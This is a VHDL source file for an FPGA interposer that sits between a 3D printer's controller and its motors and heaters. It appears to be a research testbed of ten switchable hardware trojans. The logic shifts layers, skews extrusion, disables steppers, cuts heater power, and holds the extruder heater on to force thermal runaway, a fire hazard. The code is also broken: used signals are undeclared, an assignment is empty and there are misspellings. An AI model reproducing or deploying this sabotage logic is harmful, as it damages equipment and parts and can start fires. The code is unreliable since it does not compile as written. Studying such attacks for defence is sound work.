library IEEE;
use IEEE.STD_LOGIC_1164.ALL;
use IEEE.STD_LOGIC_UNSIGNED.ALL;

entity TROJAN_TOP is
    Port (
        i_CLK               : in  std_logic;
        homing_complete     : in  std_logic;
        o_LED                 : out std_logic;
        
        -- Data Signals In
        i_D10       : in std_logic;  
        i_D8        : in std_logic;  
        i_D9        : in std_logic;  
        i_E0_DIR    : in std_logic;
        i_E0_EN     : in std_logic;
        i_E0_STEP   : in std_logic;
        i_X_DIR     : in std_logic; 
        i_X_EN      : in std_logic; 
        i_X_MIN     : in std_logic; 
        i_X_STEP    : in std_logic;   
        i_Y_DIR     : in std_logic; 
        i_Y_EN      : in std_logic; 
        i_Y_MIN     : in std_logic; 
        i_Y_STEP    : in std_logic; 
        i_Z_DIR     : in std_logic; 
        i_Z_EN      : in std_logic; 
        i_Z_MIN     : in std_logic; 
        i_Z_STEP    : in std_logic; 

        -- Data Signals Out
        o_D10       : out std_logic;  
        o_D9        : out std_logic;  
        o_D8        : out std_logic;  
        o_E0_DIR    : out std_logic;
        o_E0_EN     : out std_logic;
        o_E0_STEP   : out std_logic;
        o_X_DIR     : out std_logic; 
        o_X_EN      : out std_logic; 
        o_X_MIN     : out std_logic; 
        o_X_STEP    : out std_logic; 
        o_Y_DIR     : out std_logic; 
        o_Y_EN      : out std_logic; 
        o_Y_MIN     : out std_logic; 
        o_Y_STEP    : out std_logic; 
        o_Z_DIR     : out std_logic; 
        o_Z_EN      : out std_logic; 
        o_Z_MIN     : out std_logic; 
        o_Z_STEP    : out std_logic  
    );
end TROJAN_TOP;

architecture Behavioral of Trojan_TOP is

    COMPONENT PULSE_GEN
    PORT ( 
        i_CLK           : in  STD_LOGIC;
        i_PULSE_EN      : in  STD_LOGIC;
        i_PULSES_TO_SEND: in  std_logic_vector(4 downto 0);
        o_PULSE_SIG     : out STD_LOGIC;
        o_COMPLETE      : out STD_LOGIC
    );
    END COMPONENT;

    COMPONENT EXTRUDER_PULSE_GEN
    PORT ( 
        i_CLK           : in  STD_LOGIC;
        i_PULSE_EN      : in  STD_LOGIC;
        i_PULSES_TO_SEND: in  std_logic_vector(4 downto 0);
        o_PULSE_SIG     : out STD_LOGIC;
        o_COMPLETE      : out STD_LOGIC
    );
    END COMPONENT;

    COMPONENT EDGE_DETECTOR
	PORT(
        i_clk       : in  std_logic;
        i_input     : in  std_logic;
        o_rising    : out std_logic;
        o_falling	: out std_logic
		);
	END COMPONENT;
	
    -- Edge Detected signals
    signal X_STEP_EDGE : std_logic := '0';
    signal Y_STEP_EDGE : std_logic := '0';
    signal Z_STEP_EDGE : std_logic := '0';
    signal E_STEP_EDGE : std_logic := '0';

    -- Pulse Related Signals per Axis
    constant PULSES_PER_STEP : std_logic_vector(4 downto 0) := "10000";  -- 16 pulses per step --> 1.8 degrees (?)
    constant TEN_SECONDS     : std_logic_vector(29 downto 0) := "111011100110101100101000000000"; 
    constant ONE_HUNDRED_SECONDS : std_logic_vector (33 downto 0) := "1001010100000010111110010000000000"; 
    -- Modified Output Signals 
    signal X_STEP_MOD : std_logic := '0';
    signal Y_STEP_MOD : std_logic := '0';
    signal Z_STEP_MOD : std_logic := '0';
    signal E_STEP_MOD : std_logic := '0';

    -- Enable Signals for Axis Pulse gen 
    signal X_PULSE_EN : std_logic := '0';
    signal Y_PULSE_EN : std_logic := '0';
    signal Z_PULSE_EN : std_logic := '0';
    signal E_PULSE_EN : std_logic := '0';

    -- Required steps are sent
    signal X_STEP_COMPLETE : std_logic := '0';
    signal Y_STEP_COMPLETE : std_logic := '0';
    signal Z_STEP_COMPLETE : std_logic := '0';
    signal E_STEP_COMPLETE : std_logic := '0';

    -- Temporarily we will set the enabled trojans here, hardcoded. Vivado will optimize out the unused ones.
    signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds steps from X or Y axis during move
    signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print
    signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers
    signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment
    signal TROJ_T5_ENABLE : std_logic := '0'; -- Denial of service via disabling D8/D10 heating element power
    signal TROJ_T6_ENABLE : std_logic := '0'; -- Forcing thermal runaway and further overheating
    signal TROJ_T7_ENABLE : std_logic := '0'; -- Layer Delamination via Z-layer shift
    signal TROJ_T8_ENABLE : std_logic := '0'; -- Arbitrarily deactivating stepper motors via EN signals
    signal TROJ_T9_ENABLE : std_logic := '0'; -- Arbitrarily reducing part fan speed mid-print
    signal TROJ_T10_ENABLE : std_logic := '0'; -- Arbitrarily shifting prints by actuating endstops

    type State_Type is (IDLE, STATE_1, STATE_2, STATE_3, STATE_4, STATE_5, DISABLE);

    signal OUTPUT_LED        : std_logic := '0';
    
    -- Trojan 1 Related Signals 
    -- signal T1_STATE, T1_NEXT_STATE: State_Type := IDLE;
    -- signal TROJ_T1_COUNTER : std_logic_vector (29 downto 0) := (others=>'0');

    -- -- Trojan 2 Related Signals 
    -- signal T2_STATE, T2_NEXT_STATE: State_Type := IDLE;
    -- signal TROJ_T2_MATCH_INPUT : std_logic := '1';
    
    -- Trojan 3 Related Signals 
--    signal T3_STATE, T3_NEXT_STATE: State_Type := IDLE;
--    signal TROJ_T3_Z_PULSE_COUNT : std_logic_vector (7 downto 0) := (others=>'0'); 
    
    -- -- Trojan 4 Related Signals 
    --  signal T4_STATE, T4_NEXT_STATE: State_Type := IDLE;
    --  signal TROJ_T4_Z_PULSE_COUNT : std_logic_vector (7 downto 0) := (others=>'0');  
    
    -- -- Trojan 5 Related Signals 
    -- signal T5_STATE, T5_NEXT_STATE: State_Type := IDLE;
    -- signal TROJ_T5_COUNTER : std_logic_vector (33 downto 0) := (others=>'0');
    -- signal TROJ_T5_D10_MOD : std_logic := '0'; 
    -- signal TROJ_T5_D8_MOD  : std_logic := '0';

    -- Trojan 6 Related Signals 
    -- signal T6_STATE, T6_NEXT_STATE: State_Type := IDLE;
    -- signal TROJ_T6_COUNTER : std_logic_vector (33 downto 0) := (others=>'0');
    -- signal TROJ_T6_D10_MOD : std_logic := '1'; 

    -- Trojan 7 Related Signals 
    -- signal T7_STATE, T7_NEXT_STATE: State_Type := IDLE;
    -- signal TROJ_T7_Z_PULSE_COUNT : std_logic_vector (7 downto 0) := (others=>'0');
    -- signal TROJ_T7_Z_STEP_COUNT  : std_logic_vector (7 downto 0) := (others=>'0');

    -- Trojan 8 Related Signals 
    signal T8_STATE, T8_NEXT_STATE: State_Type := IDLE;
    signal TROJ_T8_COUNTER : std_logic_vector (33 downto 0) := (others=>'0');
    signal TROJ_T8_E0_EN_MOD : std_logic := '0';
    signal TROJ_T8_X_EN_MOD  : std_logic := '0';
    signal TROJ_T8_Y_EN_MOD  : std_logic := '0';
    signal TROJ_T8_Z_EN_MOD  : std_logic := '0';

    -- Trojan 9 Related Signals    
    -- Trojan 10 Related Signals 
    
begin

    ------- Components--------- 
    -- Edge Detectors 
    X_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_X_STEP,  o_rising => X_STEP_EDGE, o_falling => open);
    Y_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_Y_STEP,  o_rising => Y_STEP_EDGE, o_falling => open);
    Z_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_Z_STEP,  o_rising => open, o_falling => Z_STEP_EDGE);
    E_STEP_EDGE_DETECT : EDGE_DETECTOR PORT  MAP(i_clk => i_CLK, i_input => i_E0_STEP, o_rising => open, o_falling => E_STEP_EDGE);
    
    -- Pulse Generators
    X_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => X_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => X_STEP_MOD, o_COMPLETE => X_STEP_COMPLETE);
    Y_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => Y_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => Y_STEP_MOD, o_COMPLETE => Y_STEP_COMPLETE);
    Z_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => Z_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => Z_STEP_MOD, o_COMPLETE => Z_STEP_COMPLETE);
    E_PULSE_GEN : EXTRUDER_PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => E_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => E_STEP_MOD, o_COMPLETE => E_STEP_COMPLETE);
    
    --------------------------- Pulse Gen Test Start ---------------------------
    -- For testing the output of the pulse gen in trojan mode
    -- This part of the code should countinously move the X axis when bypass mode is turned off 
    -- DONE: I have tested this and confirm the pulse gen works in standalone
--    o_E0_DIR  <= '1';  
--    o_E0_EN   <= '0';   
----    o_X_MIN  <= i_X_MIN;  
--    o_E0_STEP <=   E_STEP_MOD;

--    Pulse_Test_proc : process (i_CLK)
--    begin
--        if rising_edge(i_CLK) then
--            E_PULSE_EN <= '1';
--        end if;
--    end process;
    --------------------------- Pulse Gen Test End ---------------------------
    
    -- Modify these signals as needed
    o_LED       <= OUTPUT_LED;

    o_D10       <= i_D10    ; -- Extruder
    o_D9        <= i_D9     ; -- Fan
    o_D8        <= i_D8     ; -- Heat Bed

    o_E0_DIR    <= i_E0_DIR ;
    o_E0_EN     <= i_E0_EN  ;
    o_E0_STEP   <= i_E0_STEP;   

    o_X_DIR     <= i_X_DIR  ;
    o_X_EN      <= i_X_EN   ;   
    o_X_MIN     <= i_X_MIN  ;
    o_X_STEP    <= i_X_STEP ;   

    o_Y_DIR     <= i_Y_DIR  ;
    o_Y_EN      <= i_Y_EN   ;
    o_Y_MIN     <= i_Y_MIN  ;
    o_Y_STEP    <= i_Y_STEP ; 

    o_Z_DIR     <= i_Z_DIR  ;
    o_Z_EN      <= i_Z_EN   ;
    o_Z_MIN     <= i_Z_MIN  ;            
    o_Z_STEP    <= i_Z_STEP ;
    
    -- Trojan 1 Related Signals 
    -- o_X_STEP    <= i_X_STEP when TROJ_T1_ENABLE = '0' else (i_X_STEP or X_STEP_MOD);   
    -- o_Y_STEP    <= i_Y_STEP when TROJ_T1_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);  

    -- Trojan 2 Related Signals 
    -- o_E0_STEP   <= i_E0_STEP when TROJ_T2_ENABLE = '0' else (i_E0_STEP and TROJ_T2_MATCH_INPUT);
    
    -- Trojan 3 Related Signals 
    -- o_E0_STEP   <= i_E0_STEP when TROJ_T3_ENABLE = '0' else (i_E0_STEP or E_STEP_MOD);   
        
    -- Trojan 4 Related Signals 
    -- o_Y_STEP    <= i_Y_STEP when TROJ_T4_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);
    
    -- -- Trojan 5 Related Signals 
    -- o_D10       <= o_D10 when TROJ_T5_ENABLE = '0' else (o_D10 or TROJ_T5_D10_MOD);
    -- o_D8        <= o_D8  when TROJ_T5_ENABLE = '0' else (o_D8  or TROJ_T5_D8_MOD);

    -- Trojan 6 Related Signals 
    -- o_D10       <= o_D10 when TROJ_T6_ENABLE = '0' else (o_D10 and TROJ_T6_D10_MOD);

    -- Trojan 7 Related Signals 
    -- o_Z_STEP    <= i_Z_STEP when TROJ_T7_ENABLE = '0' else (i_Z_STEP or Z_STEP_MOD);

    -- Trojan 8 Related Signals 
    -- o_E0_EN    <= i_E0_EN when TROJ_T8_ENABLE = '0' else (i__E0_EN or TROJ_T8_E0_EN_MOD); 
    -- o_X_EN     <= i_X_EN  when TROJ_T8_ENABLE = '0' else (i__X_EN  or TROJ_T8_X_EN_MOD);
    -- o_Y_EN     <= i_Y_EN  when TROJ_T8_ENABLE = '0' else (i__Y_EN  or TROJ_T8_Y_EN_MOD);
    -- o_Z_EN     <= i_Z_EN  when TROJ_T8_ENABLE = '0' else (i__Z_EN  or TROJ_T8_Z_EN_MOD);

    -- Trojan 9 Related Signals  

    -- Trojan 10 Related Signals 


    ------------------------- Trojan 1 Logic Start ---------------------------
    -- This trojan adds or removes steps from the X and Y Axis 
    trojan_t1_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            T1_STATE <= T1_NEXT_STATE;
            case T1_STATE is
                when IDLE =>
                    if (TROJ_T1_ENABLE = '1' and homing_complete = '1') then
                        T1_NEXT_STATE <= STATE_1;
                    else
                        T1_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => -- Counter Enable
                    if(TROJ_T1_COUNTER = TEN_SECONDS) then
                        TROJ_T1_COUNTER <= (others=>'0');
                        T1_NEXT_STATE <= STATE_2;
                    else 
                        TROJ_T1_COUNTER <= TROJ_T1_COUNTER + 1;
                    end if;

                when STATE_2 => -- Send Steps to motor X
                    if(X_STEP_COMPLETE = '1') then
                        X_PULSE_EN <= '0';
                        T1_NEXT_STATE <= STATE_3;
                    else 
                        X_PULSE_EN <= '1'; -- We may need an extra state to turn this off nect state .. Turning it off after completion may cause two steps
                    end if;
                        
                when STATE_3 => -- Send Steps to motor Y
                    if(Y_STEP_COMPLETE = '1') then
                        Y_PULSE_EN <= '0';
                        T1_NEXT_STATE <= IDLE;
                    else 
                        Y_PULSE_EN <= '1';
                    end if;

                when STATE_4 => T1_NEXT_STATE <= DISABLE; -- Unused
                when STATE_5 => T1_NEXT_STATE <= DISABLE; -- Unused
        
                when DISABLE => -- Turn off signals here
                    TROJ_T1_COUNTER <= (others=>'0');
                    X_PULSE_EN <= '0';
                    Y_PULSE_EN <= '0';
                    T1_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;
    ------------------------- Trojan 1 Logic End ---------------------------


    ------------------------- Trojan 2 Logic Start ---------------------------
    -- Constant over / under extrusion per print
    TROJ_T2_EXTRUDER_OUT <= ;
    
    trojan_t2_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            T2_STATE <= T2_NEXT_STATE;
            case T2_STATE is
                when IDLE =>
                    if (TROJ_T2_ENABLE = '1') then
                        T2_NEXT_STATE <= STATE_1;
                    else
                        T2_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => -- Check for falling edge of extruder step, if found let next pulse through
                    if(E_STEP_EDGE = '1') then 
                        TROJ_T2_MATCH_INPUT <= '1';
                        T2_NEXT_STATE <= STATE_2;
                    else
                        T2_NEXT_STATE <= STATE_1;
                    end if;
                    

                when STATE_2 => -- Check for falling edge of extruder step, if found, block next pulse
                    if(E_STEP_EDGE = '1') then 
                        TROJ_T2_MATCH_INPUT <= '0';
                        T2_NEXT_STATE <= STATE_1;
                    else
                        T2_NEXT_STATE <= STATE_2;
                    end if;
                        
                when STATE_3 => T2_NEXT_STATE <= DISABLE; -- Unused
                when STATE_4 => T2_NEXT_STATE <= DISABLE; -- Unused
                when STATE_5 => T2_NEXT_STATE <= DISABLE; -- Unused
        
                when DISABLE => -- Turn off signals here
                    TROJ_T2_MATCH_INPUT <= '1';
                    T2_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;
    ------------------------- Trojan 2 Logic End ---------------------------

    ------------------------- Trojan 3 Logic Start ---------------------------
    -- decreases filament retraction between layers
    TROJ_T3_EXTRUDER_OUT <= ;

    trojan_t3_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then -- and homing_complete = '1') then
            T3_STATE <= T3_NEXT_STATE;
            case T3_STATE is
                when IDLE =>
                    if (TROJ_T3_ENABLE = '1' ) then--and homing_complete = '1') then
                        T3_NEXT_STATE <= STATE_1;
                    else
                        T3_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => -- Wait for a certain number of z steps
                    if (TROJ_T3_Z_PULSE_COUNT = X"32") then -- 0x32 == 50 steps
                        TROJ_T3_Z_PULSE_COUNT <= X"00";
                        T3_NEXT_STATE <= STATE_2;
                    else 
                        if(Z_STEP_EDGE = '1') then
                            TROJ_T3_Z_PULSE_COUNT <= TROJ_T3_Z_PULSE_COUNT + 1;
                        end if;
                    end if;
                when STATE_2 => 
                    if(E_STEP_COMPLETE = '1') then
                        OUTPUT_LED <= '1';
                        E_PULSE_EN <= '0';
                        T3_NEXT_STATE <= IDLE;
                    else 
                        E_PULSE_EN <= '1';
                    end if;
                when STATE_3 => T3_NEXT_STATE <= DISABLE; -- Unused
                when STATE_4 => T3_NEXT_STATE <= DISABLE; -- Unused
                when STATE_5 => T3_NEXT_STATE <= DISABLE; -- Unused

                when DISABLE => -- Turn off signals here
                    TROJ_T3_Z_PULSE_COUNT <= (others=>'0'); 
                    E_PULSE_EN <= '0';
                    T3_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;
    ------------------------- Trojan 3 Logic End ---------------------------


    ------------------------- Trojan 4 Logic Start ---------------------------
    -- This trojan adds or removes steps from the X and Y Axis on layer increment
    trojan_t4_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            T4_STATE <= T4_NEXT_STATE;
            case T4_STATE is
                when IDLE =>
                    if (TROJ_T4_ENABLE = '1' and homing_complete = '1') then
                        T4_NEXT_STATE <= STATE_1;
                    else
                        T4_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => -- Wait for a certain number of z steps
                    if (TROJ_T4_Z_PULSE_COUNT = X"FF") then -- 255 pulses --> 
                        TROJ_T4_Z_PULSE_COUNT <= X"00";
                        T4_NEXT_STATE <= STATE_2;
                    else 
                        if(Z_STEP_EDGE = '1') then
                            TROJ_T4_Z_PULSE_COUNT <= TROJ_T4_Z_PULSE_COUNT + 1;
                        end if;
                    end if;
                when STATE_2 => 
                    if(Y_STEP_COMPLETE = '1') then
                        Y_PULSE_EN <= '0';
                        T4_NEXT_STATE <= IDLE;
                    else
                        Y_PULSE_EN <= '1';
                        T4_NEXT_STATE <= STATE_2;
                    end if;
                when STATE_3 => T4_NEXT_STATE <= DISABLE; -- Unused
                when STATE_4 => T4_NEXT_STATE <= DISABLE; -- Unused
                when STATE_5 => T4_NEXT_STATE <= DISABLE; -- Unused

                when DISABLE => -- Turn off signals here
                    TROJ_T4_Z_PULSE_COUNT <= (others=>'0'); 
                    E_PULSE_EN <= '0';
                    T4_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;    
    ------------------------- Trojan 4 Logic End ---------------------------


    ------------------------- Trojan 5 Logic Start ---------------------------
    --This trojan enacts Denial of service via disabling D8/D10 heating element power
    trojan_t5_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            T5_STATE <= T5_NEXT_STATE;
            case T5_STATE is
                when IDLE =>
                    if (TROJ_T5_ENABLE = '1' and homing_complete = '1') then
                        T5_NEXT_STATE <= STATE_1;
                    else
                        T5_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => 
                    if(TROJ_T5_COUNTER = ONE_HUNDRED_SECONDS) then
                        TROJ_T5_COUNTER <= (others=>'0');
                        T5_NEXT_STATE <= STATE_2;
                    else 
                        TROJ_T5_COUNTER <= TROJ_T5_COUNTER + 1;
                        T5_NEXT_STATE <= STATE_1;
                    end if;

                when STATE_2 => 
                    TROJ_T5_D10_MOD <= '1';  -- Need to confirm this state
                    TROJ_T5_D8_MOD  <= '1';
                    T5_NEXT_STATE <= STATE_3;

                when STATE_3 => -- Endless Loop
                    T5_NEXT_STATE <= STATE_3;

                when STATE_4 => T5_NEXT_STATE <= DISABLE; -- Unused
                when STATE_5 => T5_NEXT_STATE <= DISABLE; -- Unused

                when DISABLE => -- Turn off signals here
                    TROJ_T5_D10_MOD <= '0'; 
                    TROJ_T5_D8_MOD  <= '0';
                    T5_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;    
    ------------------------- Trojan 5 Logic End ---------------------------


    ------------------------- Trojan 6 Logic Start ---------------------------
    -- Forcing thermal runaway and further overheating
    trojan_t6_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            T6_STATE <= T6_NEXT_STATE;
            case T6_STATE is
                when IDLE =>
                    if (TROJ_T6_ENABLE = '1' and homing_complete = '1') then
                        T6_NEXT_STATE <= STATE_1;
                    else
                        T6_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => 
                    if(TROJ_T6_COUNTER = ONE_HUNDRED_SECONDS) then
                        TROJ_T6_COUNTER <= (others=>'0');
                        T6_NEXT_STATE <= STATE_2;
                    else 
                        TROJ_T6_COUNTER <= TROJ_T6_COUNTER + 1;
                        T6_NEXT_STATE <= STATE_1;
                    end if;
                    
                when STATE_2 => -- Permanently turn on E0 Heater
                    TROJ_T6_D10_MOD <= '0'; 
                    T6_NEXT_STATE <= STATE_3;

                when STATE_3 => -- Endless Loop
                    T5_NEXT_STATE <= STATE_3;

                when STATE_4 => T6_NEXT_STATE <= DISABLE; -- Unused
                when STATE_5 => T6_NEXT_STATE <= DISABLE; -- Unused

                when DISABLE => -- Turn off signals here
                    TROJ_T6_D10_MOD <= '1'; 
                    T6_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;    
    ------------------------- Trojan 6 Logic End ---------------------------

    ------------------------- Trojan 7 Logic Start ---------------------------
    -- Layer Delamination via Z-layer shift
    trojan_t7_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            T7_STATE <= T7_NEXT_STATE;
            case T7_STATE is
                when IDLE =>
                    if (TROJ_T7_ENABLE = '1' and homing_complete = '1') then
                        T7_NEXT_STATE <= STATE_1;
                    else
                        T7_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => -- Wait for a certain number of z steps
                    if (TROJ_T7_Z_PULSE_COUNT = X"FF") then -- 255 pulses -->  Need to check layer num
                        TROJ_T7_Z_PULSE_COUNT <= X"00";
                        T7_NEXT_STATE <= STATE_2;
                    else 
                        if(Z_STEP_EDGE = '1') then
                            TROJ_T7_Z_PULSE_COUNT <= TROJ_T7_Z_PULSE_COUNT + 1;
                        end if;
                    end if;

                when STATE_2 => 
                    if(Z_STEP_COMPLETE = '1') then
                        Z_PULSE_EN <= '0';
                        T7_NEXT_STATE <= STATE_3;
                    else
                        Z_PULSE_EN <= '1';
                        T7_NEXT_STATE <= STATE_2;
                    end if;

                when STATE_3 => -- do 16 steps --> about 1 layer
                    if(TROJ_T7_Z_STEP_COUNT = "0001000") then
                        TROJ_T7_Z_STEP_COUNT <= (others=>'0');
                        T7_NEXT_STATE <= STATE_4;
                    else 
                        TROJ_T7_Z_STEP_COUNT <= TROJ_T7_Z_STEP_COUNT + 1;
                        T7_NEXT_STATE <= STATE_2;
                    end if;

                when STATE_4 =>-- Endless Loop
                    T7_NEXT_STATE <= STATE_4;

                when STATE_5 => T7_NEXT_STATE <= DISABLE; -- Unused

                when DISABLE => -- Turn off signals here
                    Z_PULSE_EN <= '0';
                    T7_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;    
    ------------------------- Trojan 7 Logic End ---------------------------


    ------------------------- Trojan 8 Logic Start ---------------------------
    -- Arbitrarily deactivating stepper motors via EN signals 
    trojan_t8_proc : process (i_CLK)
    begin
        if rising_edge(i_CLK) then
            T8_STATE <= T8_NEXT_STATE;
            case T8_STATE is
                when IDLE =>
                    if (TROJ_T8_ENABLE = '1' and homing_complete = '1') then
                        T8_NEXT_STATE <= STATE_1;
                    else
                        T8_NEXT_STATE <= DISABLE;
                    end if;

                when STATE_1 => 
                    if(TROJ_T8_COUNTER = ONE_HUNDRED_SECONDS) then
                        TROJ_T8_COUNTER <= (others=>'0');
                        T8_NEXT_STATE <= STATE_2;
                    else 
                        TROJ_T8_COUNTER <= TROJ_T8_COUNTER + 1;
                        T8_NEXT_STATE <= STATE_1;
                    end if;

                when STATE_2 => 
                    TROJ_T8_E0_EN_MOD <= '1';
                    TROJ_T8_X_EN_MOD  <= '1';
                    TROJ_T8_Y_EN_MOD  <= '1';
                    TROJ_T8_Z_EN_MOD  <= '1';
                    T8_NEXT_STATE <= STATE_3;

                when STATE_3 => -- Endless Loop
                    T8_NEXT_STATE <= STATE_3;

                when STATE_4 => T8_NEXT_STATE <= DISABLE; -- Unused
                when STATE_5 => T8_NEXT_STATE <= DISABLE; -- Unused

                when DISABLE => -- Turn off signals here
                    TROJ_T8_E0_EN_MOD <= '0';
                    TROJ_T8_X_EN_MOD  <= '0';
                    TROJ_T8_Y_EN_MOD  <= '0';
                    TROJ_T8_Z_EN_MOD  <= '0';
                    T8_NEXT_STATE <= IDLE;
            end case;
        end if;
    end process;    
    ------------------------- Trojan 8 Logic End ---------------------------

end Behavioral;


